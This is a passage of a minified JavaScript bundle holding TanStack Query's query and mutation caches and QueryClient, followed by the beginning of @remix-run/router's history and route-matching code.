                        return { ...r, ...t.state };
                }
            };
            (this.state = n(this.state)),
                Ie.batch(() => {
                    this.observers.forEach((r) => {
                        r.onQueryUpdate();
                    }),
                        P(this, nt).notify({ query: this, type: "updated", action: t });
                });
        }),
        sf);
function MS(e, t) {
    return {
        fetchFailureCount: 0,
        fetchFailureReason: null,
        fetchStatus: Yg(t.networkMode) ? "fetching" : "paused",
        ...(e === void 0 && { error: null, status: "pending" }),
    };
}
function _S(e) {
    const t = typeof e.initialData == "function" ? e.initialData() : e.initialData,
        n = t !== void 0,
        r = n ? (typeof e.initialDataUpdatedAt == "function" ? e.initialDataUpdatedAt() : e.initialDataUpdatedAt) : 0;
    return {
        data: t,
        dataUpdateCount: 0,
        dataUpdatedAt: n ? (r ?? Date.now()) : 0,
        error: null,
        errorUpdateCount: 0,
        errorUpdatedAt: 0,
        fetchFailureCount: 0,
        fetchFailureReason: null,
        fetchMeta: null,
        isInvalidated: !1,
        status: n ? "success" : "pending",
        fetchStatus: "idle",
    };
}
var Mt,
    af,
    LS =
        ((af = class extends Pa {
            constructor(t = {}) {
                super();
                ee(this, Mt);
                (this.config = t), K(this, Mt, new Map());
            }
            build(t, n, r) {
                const o = n.queryKey,
                    s = n.queryHash ?? Vu(o, n);
                let i = this.get(s);
                return (
                    i ||
                        ((i = new AS({
                            client: t,
                            queryKey: o,
                            queryHash: s,
                            options: t.defaultQueryOptions(n),
                            state: r,
                            defaultOptions: t.getQueryDefaults(o),
                        })),
                        this.add(i)),
                    i
                );
            }
            add(t) {
                P(this, Mt).has(t.queryHash) ||
                    (P(this, Mt).set(t.queryHash, t), this.notify({ type: "added", query: t }));
            }
            remove(t) {
                const n = P(this, Mt).get(t.queryHash);
                n &&
                    (t.destroy(),
                    n === t && P(this, Mt).delete(t.queryHash),
                    this.notify({ type: "removed", query: t }));
            }
            clear() {
                Ie.batch(() => {
                    this.getAll().forEach((t) => {
                        this.remove(t);
                    });
                });
            }
            get(t) {
                return P(this, Mt).get(t);
            }
            getAll() {
                return [...P(this, Mt).values()];
            }
            find(t) {
                const n = { exact: !0, ...t };
                return this.getAll().find((r) => Fp(n, r));
            }
            findAll(t = {}) {
                const n = this.getAll();
                return Object.keys(t).length > 0 ? n.filter((r) => Fp(t, r)) : n;
            }
            notify(t) {
                Ie.batch(() => {
                    this.listeners.forEach((n) => {
                        n(t);
                    });
                });
            }
            onFocus() {
                Ie.batch(() => {
                    this.getAll().forEach((t) => {
                        t.onFocus();
                    });
                });
            }
            onOnline() {
                Ie.batch(() => {
                    this.getAll().forEach((t) => {
                        t.onOnline();
                    });
                });
            }
        }),
        (Mt = new WeakMap()),
        af),
    _t,
    Le,
    sr,
    Lt,
    hn,
    lf,
    OS =
        ((lf = class extends ey {
            constructor(t) {
                super();
                ee(this, Lt);
                ee(this, _t);
                ee(this, Le);
                ee(this, sr);
                (this.mutationId = t.mutationId),
                    K(this, Le, t.mutationCache),
                    K(this, _t, []),
                    (this.state = t.state || IS()),
                    this.setOptions(t.options),
                    this.scheduleGc();
            }
            setOptions(t) {
                (this.options = t), this.updateGcTime(this.options.gcTime);
            }
            get meta() {
                return this.options.meta;
            }
            addObserver(t) {
                P(this, _t).includes(t) ||
                    (P(this, _t).push(t),
                    this.clearGcTimeout(),
                    P(this, Le).notify({ type: "observerAdded", mutation: this, observer: t }));
            }
            removeObserver(t) {
                K(
                    this,
                    _t,
                    P(this, _t).filter((n) => n !== t)
                ),
                    this.scheduleGc(),
                    P(this, Le).notify({ type: "observerRemoved", mutation: this, observer: t });
            }
            optionalRemove() {
                P(this, _t).length || (this.state.status === "pending" ? this.scheduleGc() : P(this, Le).remove(this));
            }
            continue() {
                var t;
                return ((t = P(this, sr)) == null ? void 0 : t.continue()) ?? this.execute(this.state.variables);
            }
            async execute(t) {
                var s, i, a, l, u, d, p, m, f, S, v, w, g, h, y, b, k, C, E, j;
                const n = () => {
                    Te(this, Lt, hn).call(this, { type: "continue" });
                };
                K(
                    this,
                    sr,
                    Jg({
                        fn: () =>
                            this.options.mutationFn
                                ? this.options.mutationFn(t)
                                : Promise.reject(new Error("No mutationFn found")),
                        onFail: (_, M) => {
                            Te(this, Lt, hn).call(this, { type: "failed", failureCount: _, error: M });
                        },
                        onPause: () => {
                            Te(this, Lt, hn).call(this, { type: "pause" });
                        },
                        onContinue: n,
                        retry: this.options.retry ?? 0,
                        retryDelay: this.options.retryDelay,
                        networkMode: this.options.networkMode,
                        canRun: () => P(this, Le).canRun(this),
                    })
                );
                const r = this.state.status === "pending",
                    o = !P(this, sr).canStart();
                try {
                    if (r) n();
                    else {
                        Te(this, Lt, hn).call(this, { type: "pending", variables: t, isPaused: o }),
                            await ((i = (s = P(this, Le).config).onMutate) == null ? void 0 : i.call(s, t, this));
                        const M = await ((l = (a = this.options).onMutate) == null ? void 0 : l.call(a, t));
                        M !== this.state.context &&
                            Te(this, Lt, hn).call(this, { type: "pending", context: M, variables: t, isPaused: o });
                    }
                    const _ = await P(this, sr).start();
                    return (
                        await ((d = (u = P(this, Le).config).onSuccess) == null
                            ? void 0
                            : d.call(u, _, t, this.state.context, this)),
                        await ((m = (p = this.options).onSuccess) == null
                            ? void 0
                            : m.call(p, _, t, this.state.context)),
                        await ((S = (f = P(this, Le).config).onSettled) == null
                            ? void 0
                            : S.call(f, _, null, this.state.variables, this.state.context, this)),
                        await ((w = (v = this.options).onSettled) == null
                            ? void 0
                            : w.call(v, _, null, t, this.state.context)),
                        Te(this, Lt, hn).call(this, { type: "success", data: _ }),
                        _
                    );
                } catch (_) {
                    try {
                        throw (
                            (await ((h = (g = P(this, Le).config).onError) == null
                                ? void 0
                                : h.call(g, _, t, this.state.context, this)),
                            await ((b = (y = this.options).onError) == null
                                ? void 0
                                : b.call(y, _, t, this.state.context)),
                            await ((C = (k = P(this, Le).config).onSettled) == null
                                ? void 0
                                : C.call(k, void 0, _, this.state.variables, this.state.context, this)),
                            await ((j = (E = this.options).onSettled) == null
                                ? void 0
                                : j.call(E, void 0, _, t, this.state.context)),
                            _)
                        );
                    } finally {
                        Te(this, Lt, hn).call(this, { type: "error", error: _ });
                    }
                } finally {
                    P(this, Le).runNext(this);
                }
            }
        }),
        (_t = new WeakMap()),
        (Le = new WeakMap()),
        (sr = new WeakMap()),
        (Lt = new WeakSet()),
        (hn = function (t) {
            const n = (r) => {
                switch (t.type) {
                    case "failed":
                        return { ...r, failureCount: t.failureCount, failureReason: t.error };
                    case "pause":
                        return { ...r, isPaused: !0 };
                    case "continue":
                        return { ...r, isPaused: !1 };
                    case "pending":
                        return {
                            ...r,
                            context: t.context,
                            data: void 0,
                            failureCount: 0,
                            failureReason: null,
                            error: null,
                            isPaused: t.isPaused,
                            status: "pending",
                            variables: t.variables,
                            submittedAt: Date.now(),
                        };
                    case "success":
                        return {
                            ...r,
                            data: t.data,
                            failureCount: 0,
                            failureReason: null,
                            error: null,
                            status: "success",
                            isPaused: !1,
                        };
                    case "error":
                        return {
                            ...r,
                            data: void 0,
                            error: t.error,
                            failureCount: r.failureCount + 1,
                            failureReason: t.error,
                            isPaused: !1,
                            status: "error",
                        };
                }
            };
            (this.state = n(this.state)),
                Ie.batch(() => {
                    P(this, _t).forEach((r) => {
                        r.onMutationUpdate(t);
                    }),
                        P(this, Le).notify({ mutation: this, type: "updated", action: t });
                });
        }),
        lf);
function IS() {
    return {
        context: void 0,
        data: void 0,
        error: null,
        failureCount: 0,
        failureReason: null,
        isPaused: !1,
        status: "idle",
        variables: void 0,
        submittedAt: 0,
    };
}
var Gt,
    wt,
    bs,
    cf,
    DS =
        ((cf = class extends Pa {
            constructor(t = {}) {
                super();
                ee(this, Gt);
                ee(this, wt);
                ee(this, bs);
                (this.config = t), K(this, Gt, new Set()), K(this, wt, new Map()), K(this, bs, 0);
            }
            build(t, n, r) {
                const o = new OS({
                    mutationCache: this,
                    mutationId: ++Ls(this, bs)._,
                    options: t.defaultMutationOptions(n),
                    state: r,
                });
                return this.add(o), o;
            }
            add(t) {
                P(this, Gt).add(t);
                const n = oi(t);
                if (typeof n == "string") {
                    const r = P(this, wt).get(n);
                    r ? r.push(t) : P(this, wt).set(n, [t]);
                }
                this.notify({ type: "added", mutation: t });
            }
            remove(t) {
                if (P(this, Gt).delete(t)) {
                    const n = oi(t);
                    if (typeof n == "string") {
                        const r = P(this, wt).get(n);
                        if (r)
                            if (r.length > 1) {
                                const o = r.indexOf(t);
                                o !== -1 && r.splice(o, 1);
                            } else r[0] === t && P(this, wt).delete(n);
                    }
                }
                this.notify({ type: "removed", mutation: t });
            }
            canRun(t) {
                const n = oi(t);
                if (typeof n == "string") {
                    const r = P(this, wt).get(n),
                        o = r == null ? void 0 : r.find((s) => s.state.status === "pending");
                    return !o || o === t;
                } else return !0;
            }
            runNext(t) {
                var r;
                const n = oi(t);
                if (typeof n == "string") {
                    const o = (r = P(this, wt).get(n)) == null ? void 0 : r.find((s) => s !== t && s.state.isPaused);
                    return (o == null ? void 0 : o.continue()) ?? Promise.resolve();
                } else return Promise.resolve();
            }
            clear() {
                Ie.batch(() => {
                    P(this, Gt).forEach((t) => {
                        this.notify({ type: "removed", mutation: t });
                    }),
                        P(this, Gt).clear(),
                        P(this, wt).clear();
                });
            }
            getAll() {
                return Array.from(P(this, Gt));
            }
            find(t) {
                const n = { exact: !0, ...t };
                return this.getAll().find((r) => Up(n, r));
            }
            findAll(t = {}) {
                return this.getAll().filter((n) => Up(t, n));
            }
            notify(t) {
                Ie.batch(() => {
                    this.listeners.forEach((n) => {
                        n(t);
                    });
                });
            }
            resumePausedMutations() {
                const t = this.getAll().filter((n) => n.state.isPaused);
                return Ie.batch(() => Promise.all(t.map((n) => n.continue().catch(vt))));
            }
        }),
        (Gt = new WeakMap()),
        (wt = new WeakMap()),
        (bs = new WeakMap()),
        cf);
function oi(e) {
    var t;
    return (t = e.options.scope) == null ? void 0 : t.id;
}
function Bp(e) {
    return {
        onFetch: (t, n) => {
            var d, p, m, f, S;
            const r = t.options,
                o =
                    (m = (p = (d = t.fetchOptions) == null ? void 0 : d.meta) == null ? void 0 : p.fetchMore) == null
                        ? void 0
                        : m.direction,
                s = ((f = t.state.data) == null ? void 0 : f.pages) || [],
                i = ((S = t.state.data) == null ? void 0 : S.pageParams) || [];
            let a = { pages: [], pageParams: [] },
                l = 0;
            const u = async () => {
                let v = !1;
                const w = (y) => {
                        Object.defineProperty(y, "signal", {
                            enumerable: !0,
                            get: () => (
                                t.signal.aborted
                                    ? (v = !0)
                                    : t.signal.addEventListener("abort", () => {
                                          v = !0;
                                      }),
                                t.signal
                            ),
                        });
                    },
                    g = qg(t.options, t.fetchOptions),
                    h = async (y, b, k) => {
                        if (v) return Promise.reject();
                        if (b == null && y.pages.length) return Promise.resolve(y);
                        const E = (() => {
                                const H = {
                                    client: t.client,
                                    queryKey: t.queryKey,
                                    pageParam: b,
                                    direction: k ? "backward" : "forward",
                                    meta: t.options.meta,
                                };
                                return w(H), H;
                            })(),
                            j = await g(E),
                            { maxPages: _ } = t.options,
                            M = k ? CS : kS;
                        return { pages: M(y.pages, j, _), pageParams: M(y.pageParams, b, _) };
                    };
                if (o && s.length) {
                    const y = o === "backward",
                        b = y ? zS : Vp,
                        k = { pages: s, pageParams: i },
                        C = b(r, k);
                    a = await h(k, C, y);
                } else {
                    const y = e ?? s.length;
                    do {
                        const b = l === 0 ? (i[0] ?? r.initialPageParam) : Vp(r, a);
                        if (l > 0 && b == null) break;
                        (a = await h(a, b)), l++;
                    } while (l < y);
                }
                return a;
            };
            t.options.persister
                ? (t.fetchFn = () => {
                      var v, w;
                      return (w = (v = t.options).persister) == null
                          ? void 0
                          : w.call(
                                v,
                                u,
                                { client: t.client, queryKey: t.queryKey, meta: t.options.meta, signal: t.signal },
                                n
                            );
                  })
                : (t.fetchFn = u);
        },
    };
}
function Vp(e, { pages: t, pageParams: n }) {
    const r = t.length - 1;
    return t.length > 0 ? e.getNextPageParam(t[r], t, n[r], n) : void 0;
}
function zS(e, { pages: t, pageParams: n }) {
    var r;
    return t.length > 0 ? ((r = e.getPreviousPageParam) == null ? void 0 : r.call(e, t[0], t, n[0], n)) : void 0;
}
var me,
    bn,
    kn,
    to,
    no,
    Cn,
    ro,
    oo,
    uf,
    FS =
        ((uf = class {
            constructor(e = {}) {
                ee(this, me);
                ee(this, bn);
                ee(this, kn);
                ee(this, to);
                ee(this, no);
                ee(this, Cn);
                ee(this, ro);
                ee(this, oo);
                K(this, me, e.queryCache || new LS()),
                    K(this, bn, e.mutationCache || new DS()),
                    K(this, kn, e.defaultOptions || {}),
                    K(this, to, new Map()),
                    K(this, no, new Map()),
                    K(this, Cn, 0);
            }
            mount() {
                Ls(this, Cn)._++,
                    P(this, Cn) === 1 &&
                        (K(
                            this,
                            ro,
                            Xg.subscribe(async (e) => {
                                e && (await this.resumePausedMutations(), P(this, me).onFocus());
                            })
                        ),
                        K(
                            this,
                            oo,
                            Ji.subscribe(async (e) => {
                                e && (await this.resumePausedMutations(), P(this, me).onOnline());
                            })
                        ));
            }
            unmount() {
                var e, t;
                Ls(this, Cn)._--,
                    P(this, Cn) === 0 &&
                        ((e = P(this, ro)) == null || e.call(this),
                        K(this, ro, void 0),
                        (t = P(this, oo)) == null || t.call(this),
                        K(this, oo, void 0));
            }
            isFetching(e) {
                return P(this, me).findAll({ ...e, fetchStatus: "fetching" }).length;
            }
            isMutating(e) {
                return P(this, bn).findAll({ ...e, status: "pending" }).length;
            }
            getQueryData(e) {
                var n;
                const t = this.defaultQueryOptions({ queryKey: e });
                return (n = P(this, me).get(t.queryHash)) == null ? void 0 : n.state.data;
            }
            ensureQueryData(e) {
                const t = this.defaultQueryOptions(e),
                    n = P(this, me).build(this, t),
                    r = n.state.data;
                return r === void 0
                    ? this.fetchQuery(e)
                    : (e.revalidateIfStale && n.isStaleByTime(Pc(t.staleTime, n)) && this.prefetchQuery(t),
                      Promise.resolve(r));
            }
            getQueriesData(e) {
                return P(this, me)
                    .findAll(e)
                    .map(({ queryKey: t, state: n }) => {
                        const r = n.data;
                        return [t, r];
                    });
            }
            setQueryData(e, t, n) {
                const r = this.defaultQueryOptions({ queryKey: e }),
                    o = P(this, me).get(r.queryHash),
                    s = o == null ? void 0 : o.state.data,
                    i = yS(t, s);
                if (i !== void 0)
                    return P(this, me)
                        .build(this, r)
                        .setData(i, { ...n, manual: !0 });
            }
            setQueriesData(e, t, n) {
                return Ie.batch(() =>
                    P(this, me)
                        .findAll(e)
                        .map(({ queryKey: r }) => [r, this.setQueryData(r, t, n)])
                );
            }
            getQueryState(e) {
                var n;
                const t = this.defaultQueryOptions({ queryKey: e });
                return (n = P(this, me).get(t.queryHash)) == null ? void 0 : n.state;
            }
            removeQueries(e) {
                const t = P(this, me);
                Ie.batch(() => {
                    t.findAll(e).forEach((n) => {
                        t.remove(n);
                    });
                });
            }
            resetQueries(e, t) {
                const n = P(this, me);
                return Ie.batch(
                    () => (
                        n.findAll(e).forEach((r) => {
                            r.reset();
                        }),
                        this.refetchQueries({ type: "active", ...e }, t)
                    )
                );
            }
            cancelQueries(e, t = {}) {
                const n = { revert: !0, ...t },
                    r = Ie.batch(() =>
                        P(this, me)
                            .findAll(e)
                            .map((o) => o.cancel(n))
                    );
                return Promise.all(r).then(vt).catch(vt);
            }
            invalidateQueries(e, t = {}) {
                return Ie.batch(
                    () => (
                        P(this, me)
                            .findAll(e)
                            .forEach((n) => {
                                n.invalidate();
                            }),
                        (e == null ? void 0 : e.refetchType) === "none"
                            ? Promise.resolve()
                            : this.refetchQueries(
                                  {
                                      ...e,
                                      type:
                                          (e == null ? void 0 : e.refetchType) ??
                                          (e == null ? void 0 : e.type) ??
                                          "active",
                                  },
                                  t
                              )
                    )
                );
            }
            refetchQueries(e, t = {}) {
                const n = { ...t, cancelRefetch: t.cancelRefetch ?? !0 },
                    r = Ie.batch(() =>
                        P(this, me)
                            .findAll(e)
                            .filter((o) => !o.isDisabled() && !o.isStatic())
                            .map((o) => {
                                let s = o.fetch(void 0, n);
                                return (
                                    n.throwOnError || (s = s.catch(vt)),
                                    o.state.fetchStatus === "paused" ? Promise.resolve() : s
                                );
                            })
                    );
                return Promise.all(r).then(vt);
            }
            fetchQuery(e) {
                const t = this.defaultQueryOptions(e);
                t.retry === void 0 && (t.retry = !1);
                const n = P(this, me).build(this, t);
                return n.isStaleByTime(Pc(t.staleTime, n)) ? n.fetch(t) : Promise.resolve(n.state.data);
            }
            prefetchQuery(e) {
                return this.fetchQuery(e).then(vt).catch(vt);
            }
            fetchInfiniteQuery(e) {
                return (e.behavior = Bp(e.pages)), this.fetchQuery(e);
            }
            prefetchInfiniteQuery(e) {
                return this.fetchInfiniteQuery(e).then(vt).catch(vt);
            }
            ensureInfiniteQueryData(e) {
                return (e.behavior = Bp(e.pages)), this.ensureQueryData(e);
            }
            resumePausedMutations() {
                return Ji.isOnline() ? P(this, bn).resumePausedMutations() : Promise.resolve();
            }
            getQueryCache() {
                return P(this, me);
            }
            getMutationCache() {
                return P(this, bn);
            }
            getDefaultOptions() {
                return P(this, kn);
            }
            setDefaultOptions(e) {
                K(this, kn, e);
            }
            setQueryDefaults(e, t) {
                P(this, to).set(ys(e), { queryKey: e, defaultOptions: t });
            }
            getQueryDefaults(e) {
                const t = [...P(this, to).values()],
                    n = {};
                return (
                    t.forEach((r) => {
                        vs(e, r.queryKey) && Object.assign(n, r.defaultOptions);
                    }),
                    n
                );
            }
            setMutationDefaults(e, t) {
                P(this, no).set(ys(e), { mutationKey: e, defaultOptions: t });
            }
            getMutationDefaults(e) {
                const t = [...P(this, no).values()],
                    n = {};
                return (
                    t.forEach((r) => {
                        vs(e, r.mutationKey) && Object.assign(n, r.defaultOptions);
                    }),
                    n
                );
            }
            defaultQueryOptions(e) {
                if (e._defaulted) return e;
                const t = { ...P(this, kn).queries, ...this.getQueryDefaults(e.queryKey), ...e, _defaulted: !0 };
                return (
                    t.queryHash || (t.queryHash = Vu(t.queryKey, t)),
                    t.refetchOnReconnect === void 0 && (t.refetchOnReconnect = t.networkMode !== "always"),
                    t.throwOnError === void 0 && (t.throwOnError = !!t.suspense),
                    !t.networkMode && t.persister && (t.networkMode = "offlineFirst"),
                    t.queryFn === Wu && (t.enabled = !1),
                    t
                );
            }
            defaultMutationOptions(e) {
                return e != null && e._defaulted
                    ? e
                    : {
                          ...P(this, kn).mutations,
                          ...((e == null ? void 0 : e.mutationKey) && this.getMutationDefaults(e.mutationKey)),
                          ...e,
                          _defaulted: !0,
                      };
            }
            clear() {
                P(this, me).clear(), P(this, bn).clear();
            }
        }),
        (me = new WeakMap()),
        (bn = new WeakMap()),
        (kn = new WeakMap()),
        (to = new WeakMap()),
        (no = new WeakMap()),
        (Cn = new WeakMap()),
        (ro = new WeakMap()),
        (oo = new WeakMap()),
        uf),
    US = x.createContext(void 0),
    $S = ({ client: e, children: t }) => (
        x.useEffect(
            () => (
                e.mount(),
                () => {
                    e.unmount();
                }
            ),
            [e]
        ),
        c.jsx(US.Provider, { value: e, children: t })
    );
/**
 * @remix-run/router v1.23.0
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */ function xs() {
    return (
        (xs = Object.assign
            ? Object.assign.bind()
            : function (e) {
                  for (var t = 1; t < arguments.length; t++) {
                      var n = arguments[t];
                      for (var r in n) Object.prototype.hasOwnProperty.call(n, r) && (e[r] = n[r]);
                  }
                  return e;
              }),
        xs.apply(this, arguments)
    );
}
var Pn;
(function (e) {
    (e.Pop = "POP"), (e.Push = "PUSH"), (e.Replace = "REPLACE");
})(Pn || (Pn = {}));
const Wp = "popstate";
function HS(e) {
    e === void 0 && (e = {});
    function t(r, o) {
        let { pathname: s, search: i, hash: a } = r.location;
        return jc(
            "",
            { pathname: s, search: i, hash: a },
            (o.state && o.state.usr) || null,
            (o.state && o.state.key) || "default"
        );
    }
    function n(r, o) {
        return typeof o == "string" ? o : ea(o);
    }
    return VS(t, n, null, e);
}
function xe(e, t) {
    if (e === !1 || e === null || typeof e > "u") throw new Error(t);
}
function ty(e, t) {
    if (!e) {
        typeof console < "u" && console.warn(t);
        try {
            throw new Error(t);
        } catch {}
    }
}
function BS() {
    return Math.random().toString(36).substr(2, 8);
}
function Kp(e, t) {
    return { usr: e.state, key: e.key, idx: t };
}
function jc(e, t, n, r) {
    return (
        n === void 0 && (n = null),
        xs(
            { pathname: typeof e == "string" ? e : e.pathname, search: "", hash: "" },
            typeof t == "string" ? bo(t) : t,
            { state: n, key: (t && t.key) || r || BS() }
        )
    );
}
function ea(e) {
    let { pathname: t = "/", search: n = "", hash: r = "" } = e;
    return (
        n && n !== "?" && (t += n.charAt(0) === "?" ? n : "?" + n),
        r && r !== "#" && (t += r.charAt(0) === "#" ? r : "#" + r),
        t
    );
}
function bo(e) {
    let t = {};
    if (e) {
        let n = e.indexOf("#");
        n >= 0 && ((t.hash = e.substr(n)), (e = e.substr(0, n)));
        let r = e.indexOf("?");
        r >= 0 && ((t.search = e.substr(r)), (e = e.substr(0, r))), e && (t.pathname = e);
    }
    return t;
}
function VS(e, t, n, r) {
    r === void 0 && (r = {});
    let { window: o = document.defaultView, v5Compat: s = !1 } = r,
        i = o.history,
        a = Pn.Pop,
        l = null,
        u = d();
    u == null && ((u = 0), i.replaceState(xs({}, i.state, { idx: u }), ""));
    function d() {
        return (i.state || { idx: null }).idx;
    }
    function p() {
        a = Pn.Pop;
        let w = d(),
            g = w == null ? null : w - u;
        (u = w), l && l({ action: a, location: v.location, delta: g });
    }
    function m(w, g) {
        a = Pn.Push;
        let h = jc(v.location, w, g);
        u = d() + 1;
        let y = Kp(h, u),
            b = v.createHref(h);
        try {
            i.pushState(y, "", b);
        } catch (k) {
            if (k instanceof DOMException && k.name === "DataCloneError") throw k;
            o.location.assign(b);
        }
        s && l && l({ action: a, location: v.location, delta: 1 });
    }
    function f(w, g) {
        a = Pn.Replace;
        let h = jc(v.location, w, g);
        u = d();
        let y = Kp(h, u),
            b = v.createHref(h);
        i.replaceState(y, "", b), s && l && l({ action: a, location: v.location, delta: 0 });
    }
    function S(w) {
        let g = o.location.origin !== "null" ? o.location.origin : o.location.href,
            h = typeof w == "string" ? w : ea(w);
        return (
            (h = h.replace(/ $/, "%20")),
            xe(g, "No window.location.(origin|href) available to create URL for href: " + h),
            new URL(h, g)
        );
    }
    let v = {
        get action() {
            return a;
        },
        get location() {
            return e(o, i);
        },
        listen(w) {
            if (l) throw new Error("A history only accepts one active listener");
            return (
                o.addEventListener(Wp, p),
                (l = w),
                () => {
                    o.removeEventListener(Wp, p), (l = null);
                }
            );
        },
        createHref(w) {
            return t(o, w);
        },
        createURL: S,
        encodeLocation(w) {
            let g = S(w);
            return { pathname: g.pathname, search: g.search, hash: g.hash };
        },
        push: m,
        replace: f,
        go(w) {
            return i.go(w);
        },
    };
    return v;
}
var Qp;
(function (e) {
    (e.data = "data"), (e.deferred = "deferred"), (e.redirect = "redirect"), (e.error = "error");
})(Qp || (Qp = {}));
function WS(e, t, n) {
    return n === void 0 && (n = "/"), KS(e, t, n, !1);
}
function KS(e, t, n, r) {
    let o = typeof t == "string" ? bo(t) : t,
        s = Ku(o.pathname || "/", n);
    if (s == null) return null;
    let i = ny(e);
    QS(i);
    let a = null;
    for (let l = 0; a == null && l < i.length; ++l) {
        let u = ob(s);
        a = nb(i[l], u, r);
    }
    return a;
}
function ny(e, t, n, r) {
    t === void 0 && (t = []), n === void 0 && (n = []), r === void 0 && (r = "");
    let o = (s, i, a) => {
        let l = {
            relativePath: a === void 0 ? s.path || "" : a,
            caseSensitive: s.caseSensitive === !0,
            childrenIndex: i,
            route: s,
        };
        l.relativePath.startsWith("/") &&
            (xe(
                l.relativePath.startsWith(r),
                'Absolute route path "' +
                    l.relativePath +
                    '" nested under path ' +
                    ('"' + r + '" is not valid. An absolute child route path ') +
                    "must start with the combined path of all its parent routes."
            ),
            (l.relativePath = l.relativePath.slice(r.length)));
        let u = In([r, l.relativePath]),
            d = n.concat(l);
        s.children &&
            s.children.length > 0 &&
            (xe(
                s.index !== !0,
                "Index routes must not have child routes. Please remove " +
                    ('all child routes from route path "' + u + '".')
            ),
            ny(s.children, t, d, u)),
            !(s.path == null && !s.index) && t.push({ path: u, score: eb(u, s.index), routesMeta: d });
    };
    return (
        e.forEach((s, i) => {
            var a;
            if (s.path === "" || !((a = s.path) != null && a.includes("?"))) o(s, i);
            else for (let l of ry(s.path)) o(s, i, l);
        }),
        t
    );
}
function ry(e) {
    let t = e.split("/");
    if (t.length === 0) return [];
    let [n, ...r] = t,
        o = n.endsWith("?"),
        s = n.replace(/\?$/, "");
    if (r.length === 0) return o ? [s, ""] : [s];
    let i = ry(r.join("/")),
        a = [];
    return (
        a.push(...i.map((l) => (l === "" ? s : [s, l].join("/")))),
        o && a.push(...i),
        a.map((l) => (e.startsWith("/") && l === "" ? "/" : l))
    );
}
function QS(e) {
    e.sort((t, n) =>
        t.score !== n.score
            ? n.score - t.score
            : tb(
                  t.routesMeta.map((r) => r.childrenIndex),
                  n.routesMeta.map((r) => r.childrenIndex)
              )
    );
}
const GS = /^:[\w-]+$/,
    qS = 3,
    XS = 2,
    YS = 1,
    ZS = 10,
    JS = -2,
    Gp = (e) => e === "*";
function eb(e, t) {
    let n = e.split("/"),
        r = n.length;
    return (
        n.some(Gp) && (r += JS),
        t && (r += XS),
        n.filter((o) => !Gp(o)).reduce((o, s) => o + (GS.test(s) ? qS : s === "" ? YS : ZS), r)
    );
}
function tb(e, t) {
    return e.length === t.length && e.slice(0, -1).every((r, o) => r === t[o]) ? e[e.length - 1] - t[t.length - 1] : 0;
}
function nb(e, t, n) {
    let { routesMeta: r } = e,
        o = {},
        s = "/",
        i = [];
    for (let a = 0; a < r.length; ++a) {
        let l = r[a],
            u = a === r.length - 1,
            d = s === "/" ? t : t.slice(s.length) || "/",
            p = qp({ path: l.relativePath, caseSensitive: l.caseSensitive, end: u }, d),
            m = l.route;
        if (
            (!p &&
                u &&
                n &&
                !r[r.length - 1].route.index &&
                (p = qp({ path: l.relativePath, caseSensitive: l.caseSensitive, end: !1 }, d)),
            !p)
        )
            return null;
        Object.assign(o, p.params),
            i.push({ params: o, pathname: In([s, p.pathname]), pathnameBase: lb(In([s, p.pathnameBase])), route: m }),
            p.pathnameBase !== "/" && (s = In([s, p.pathnameBase]));
    }
    return i;
}
function qp(e, t) {
    typeof e == "string" && (e = { path: e, caseSensitive: !1, end: !0 });
    let [n, r] = rb(e.path, e.caseSensitive, e.end),
        o = t.match(n);
    if (!o) return null;
    let s = o[0],
        i = s.replace(/(.)\/+$/, "$1"),
        a = o.slice(1);
    return {
        params: r.reduce((u, d, p) => {
            let { paramName: m, isOptional: f } = d;
            if (m === "*") {
                let v = a[p] || "";
                i = s.slice(0, s.length - v.length).replace(/(.)\/+$/, "$1");
            }
            const S = a[p];
            return f && !S ? (u[m] = void 0) : (u[m] = (S || "").replace(/%2F/g, "/")), u;
        }, {}),
        pathname: s,
        pathnameBase: i,
        pattern: e,
    };
}
function rb(e, t, n) {
    t === void 0 && (t = !1),
        n === void 0 && (n = !0),
        ty(
            e === "*" || !e.endsWith("*") || e.endsWith("/*"),
            'Route path "' +
                e +
                '" will be treated as if it were ' +
                ('"' + e.replace(/\*$/, "/*") + '" because the `*` character must ') +
                "always follow a `/` in the pattern. To get rid of this warning, " +
                ('please change the route path to "' + e.replace(/\*$/, "/*") + '".')
        );
    let r = [],
        o =
            "^" +
            e
                .replace(/\/*\*?$/, "")
                .replace(/^\/*/, "/")
                .replace(/[\\.*+^${}|()[\]]/g, "\\$&")
                .replace(
                    /\/:([\w-]+)(\?)?/g,
                    (i, a, l) => (r.push({ paramName: a, isOptional: l != null }), l ? "/?([^\\/]+)?" : "/([^\\/]+)")
                );
    return (
        e.endsWith("*")
            ? (r.push({ paramName: "*" }), (o += e === "*" || e === "/*" ? "(.*)$" : "(?:\\/(.+)|\\/*)$"))
            : n
              ? (o += "\\/*$")
              : e !== "" && e !== "/" && (o += "(?:(?=\\/|$))"),
        [new RegExp(o, t ? void 0 : "i"), r]
    );
}
function ob(e) {
    try {
        return e
            .split("/")
            .map((t) => decodeURIComponent(t).replace(/\//g, "%2F"))
            .join("/");
    } catch (t) {
        return (
            ty(
                !1,
                'The URL path "' +
                    e +
                    '" could not be decoded because it is is a malformed URL segment. This is probably due to a bad percent ' +
                    ("encoding (" + t + ").")
            ),
            e
        );
    }
}
function Ku(e, t) {
    if (t === "/") return e;
    if (!e.toLowerCase().startsWith(t.toLowerCase())) return null;
    let n = t.endsWith("/") ? t.length - 1 : t.length,
        r = e.charAt(n);
    return r && r !== "/" ? null : e.slice(n) || "/";
}
function sb(e, t) {
    t === void 0 && (t = "/");
    let { pathname: n, search: r = "", hash: o = "" } = typeof e == "string" ? bo(e) : e;
    return { pathname: n ? (n.startsWith("/") ? n : ib(n, t)) : t, search: cb(r), hash: ub(o) };
}
function ib(e, t) {
    let n = t.replace(/\/+$/, "").split("/");
    return (
        e.split("/").forEach((o) => {
            o === ".." ? n.length > 1 && n.pop() : o !== "." && n.push(o);
        }),
        n.length > 1 ? n.join("/") : "/"
    );
}
function yl(e, t, n, r) {
    return (
        "Cannot include a '" +
        e +
        "' character in a manually specified " +
        ("`to." + t + "` field [" + JSON.stringify(r) + "].  Please separate it out to the ") +
        ("`to." + n + "` field. Alternatively you may provide the full path as ") +
        'a string in <Link to="..."> and the router will parse it for you.'
    );
}
function ab(e) {
    return e.filter((t, n) => n === 0 || (t.route.path && t.route.path.length > 0));
}
function oy(e, t) {
    let n = ab(e);
